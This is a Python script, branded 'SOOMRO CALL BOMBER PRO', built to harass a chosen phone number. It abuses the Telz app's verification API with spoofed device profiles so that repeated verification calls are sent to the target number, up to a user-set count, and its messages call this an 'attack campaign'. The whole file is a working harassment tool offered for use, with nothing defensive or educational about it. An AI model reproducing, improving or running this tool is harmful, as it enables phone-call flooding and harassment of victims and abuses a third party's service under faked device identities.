#!/usr/bin/env python3
"""
====================================================================
                🔥 SOOMRO CALL BOMBER PRO v3.0 🔥
                  Developer: SOOMRO 
            Ultimate Termux CLI Edition (Fully Branded)
====================================================================
"""

import requests
import json
import time
import uuid
import sys
import os

# ========== YOUR CUSTOM BRANDING & CONTACTS ==========
WHATSAPP_NUM = "+923XXXXXXXXX"  # Yahan apna real WhatsApp number likh lein
COMMUNITY_LINK = "https://chat.whatsapp.com/YourCommunityLink"  # Yahan apni WhatsApp Community link daalein
# ======================================================

# ========== ADVANCED ANSI STYLING & COLORS ==========
R = "\033[1;31m"   # Bold Red
G = "\033[1;32m"   # Bold Green
Y = "\033[1;33m"   # Bold Yellow
B = "\033[1;34m"   # Bold Blue
M = "\033[1;35m"   # Bold Magenta
C = "\033[1;36m"   # Bold Cyan
W = "\033[1;37m"   # Bold White
D = "\033[2;37m"   # Dim White
RES = "\033[0m"    # Reset Color

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    print(f"""{M}
╔══════════════════════════════════════════════════════════╗
║  ███████╗ ██████╗  ██████╗ ███╗   ███╗██████╗  ██████╗   ║
║  ██╔════╝██╔═══██╗██╔═══██╗████╗ ████║██╔══██╗██╔═══██╗  ║
║  ███████╗██║   ██║██║   ██║██╔████╔██║██████╔╝██║   ██║  ║
║  ╚════██║██║   ██║██║   ██║██║╚██╔╝██║██╔══██╗██║   ██║  ║
║  ███████║╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║╚██████╔╝  ║
║  ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝   ║
╚══════════════════════════════════════════════════════════╝{RES}
{C} 📌 [DEVELOPER]  : {W}SOOMRO
{C} 📱 [WHATSAPP]   : {W}{WHATSAPP_NUM}
{C} 🌐 [COMMUNITY]  : {W}{COMMUNITY_LINK}
{R}────────────────────────────────────────────────────────────{RES}\n""")

# ========== TELZ API CORE CLIENT ==========
class TelzClient:
    base_url = "https://api.telz.com/"
    headers = {
        'User-Agent': "Telz-Android/17.5.33",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json; charset=UTF-8"
    }
    
    def __init__(self):
        self.android_id = uuid.uuid4().hex[:16]
        self.app_version = "17.5.33"
        self.os_type = "android"
        self.os_version = "15"
        self.uuid = str(uuid.uuid4())
        self.session = requests.Session()
    
    @staticmethod
    def random_device_name():
        devices = ["Pixel-Pro-9", "Xiaomi-14-Ultra", "Samsung-S24", "OnePlus-12", "Moto-Edge-50"]
        return f"{devices[int(uuid.uuid4().int % len(devices))]}-{uuid.uuid4().hex[:6]}"
    
    def _post(self, endpoint, data, timeout=10.0):
        url = self.base_url + endpoint
        data.update({
            "android_id": self.android_id,
            "app_version": self.app_version,
            "os": self.os_type,
            "os_version": self.os_version,
            "ts": int(time.time() * 1000),
            "uuid": self.uuid
        })
        response = self.session.post(url, data=json.dumps(data), headers=self.headers, timeout=timeout)
        if response.status_code == 429:
            raise RuntimeError("Rate limit hit (Too fast)")
        response.raise_for_status()
        try:
            return response.json()
        except ValueError:
            return response.text
    
    def auth_list(self):
        return self._post("app/auth_list", {"event": "auth_list"})
    
    def run(self):
        return self._post("app/run", {
            "event": "run",
            "device_name": self.random_device_name(),
            "ipv4_address": "10.1.10.1",
            "ipv6_address": "FE80::1",
            "lang": "en",
            "network_country": "tr",
            "network_type": "4G",
            "roaming": "no",
            "root": "no",
            "run_id": "",
            "sim_country": "tr"
        })
    
    def validate_phonenumber(self, phone):
        return self._post("app/validate_phonenumber", {"event": "validate_phonenumber", "phone": phone, "region": "TR"})
    
    def auth_call(self, phone):
        return self._post("app/auth_call", {"event": "auth_call", "phone": phone, "attempt": "0", "lang": "en"})

def main():
    print_banner()
    
    # Input Phone Number with styling
    phone_input = input(f"{Y} ➔ Enter Target Phone Number {D}(e.g. 9876543210): {W}").strip()
    
    # Formatting Number
    if len(phone_input) == 10:
        phone = "+91" + phone_input
    elif len(phone_input) == 12 and phone_input.startswith("91"):
        phone = "+" + phone_input
    elif not phone_input.startswith("+"):
        phone = "+" + phone_input
    else:
        phone = phone_input

    try:
        total_attempts = int(input(f"{Y} ➔ Enter Total Calls to Dispatch {D}(e.g. 5, 10): {W}").strip())
    except:
        total_attempts = 5

    print(f"\n{C} [✦] Target Locked      : {W}{phone}")
    print(f"{C} [✦] Queue Length       : {W}{total_attempts} Calls")
    print(f"{R}────────────────────────────────────────────────────────────{RES}\n")
    
    input(f"{M} [!] Press {W}[ ENTER ]{M} to launch the SOOMRO attack engine...{RES}")
    print_banner()
    
    print(f"{B} [*] Initializing secure virtual sockets...{RES}")
    
    try:
        client = TelzClient()
        
        print(f"{B} [*] Establishing secure handshake with server...{RES}")
        client.auth_list()
        
        print(f"{B} [*] Spawning anonymous spoofed device profile...{RES}")
        client.run()
        
        print(f"{B} [*] Validating recipient channel parameters...{RES}")
        client.validate_phonenumber(phone)
        
        success_count = 0
        for i in range(total_attempts):
            print(f"\n{Y}┌──────────────────────────────────────────┐")
            print(f"│          DISPATCHING CALL [{i+1}/{total_attempts}]         │")
            print(f"└──────────────────────────────────────────┘{RES}")
            try:
                client.auth_call(phone)
                success_count += 1
                print(f"{G} [+] Status : CALL DISPATCHED SUCCESSFULLY! ✔{RES}")
                
                if i < total_attempts - 1:
                    print(f"{C} [*] Cooling down network buffers (20s)...{RES}")
                    for sec in range(20, 0, -1):
                        sys.stdout.write(f"\r{M} [⏳] Next wave ining -> {sec} seconds remaining... {RES}")
                        sys.stdout.flush()
                        time.sleep(1)
                    print("\r" + " " * 50 + "\r", end="")
            except Exception as e:
                print(f"{R} [-] Status : FAILED ✘ ({str(e)[:30]}){RES}")
                
        # Final Summary Box with Full Branding
        print(f"\n{G}╔══════════════════════════════════════════════════════════╗")
        print(f"║               🎉 ATTACK CAMPAIGN FINISHED! 🎉            ║")
        print(f"╠══════════════════════════════════════════════════════════╣")
        print(f"║  Target Number : {phone:<39} ║")
        print(f"║  Success Rate  : {success_count}/{total_attempts} Calls Delivered                       ║")
        print(f"╚══════════════════════════════════════════════════════════╝{RES}")
        
        # Permanent Branding Footer
        print(f"\n{M}═════════════════════════ SUPPORT ════════════════════════{RES}")
        print(f"{C} 📱 WhatsApp Contact : {W}{WHATSAPP_NUM}")
        print(f"{C} 🌐 Community Group  : {W}{COMMUNITY_LINK}")
        print(f"{M}══════════════════════════════════════════════════════════{RES}\n")
        
    except Exception as e:
        print(f"\n{R} [!] Critical Error Encountered: {e}{RES}")

if __name__ == "__main__":
    main()
